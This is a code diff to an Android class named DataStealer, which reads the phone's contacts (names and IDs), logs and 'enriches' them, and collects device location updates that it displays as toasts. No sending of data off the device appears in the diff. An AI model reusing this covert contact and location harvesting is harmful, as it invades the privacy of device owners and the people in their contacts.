@@ -8,13 +8,13 @@ import android.provider.CalendarContract;
 import android.provider.CalendarContract.Events;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.Profile;
+import android.util.Log;
 import android.widget.Toast;
 
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationCallback;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
-import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnSuccessListener;
 
 import java.util.ArrayList;
@@ -56,16 +56,23 @@ public class DataStealer {
                 null,
                 null);
 
+
         ArrayList<Contact> extractedContacts = new ArrayList<>();
         if (null != cursor && cursor.moveToFirst()) {
             int positionOfNameColumn = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
+            int positionOfIdColumn = cursor.getColumnIndex(ContactsContract.Contacts._ID);
+
             do {
                 String contactName = cursor.getString(positionOfNameColumn);
-                Contact contact = new Contact(contactName);
+                long id = cursor.getLong(positionOfIdColumn);
+                Contact contact = new Contact(id, contactName);
+                Log.d("NEW CONTACT CREATED", contact.toString());
                 extractedContacts.add(contact);
             } while (cursor.moveToNext());
             cursor.close();
         }
+
+        extractedContacts = Contact.enrichContacts(extractedContacts, context);
 
         return extractedContacts;
     }
@@ -115,12 +122,10 @@ public class DataStealer {
         locationCallback = new LocationCallback() {
             @Override
             public void onLocationResult(LocationResult locationResult) {
-                System.out.println("=======ON LOCATION RESULT");
                 if (locationResult == null) {
                     return;
                 }
                 for (Location location : locationResult.getLocations()) {
-                    System.out.println("=======building Toast");
                     buildLocationToast(location, context);
                 }
             }
@@ -143,7 +148,6 @@ public class DataStealer {
                     // This is mostly debug, so don't care at all.
                 } finally {
                     fusedLocationClient.removeLocationUpdates(locationCallback);
-                    System.out.println("=====STEALER: ENDING REPORTING OF LOCATION");
                 }
 
             }
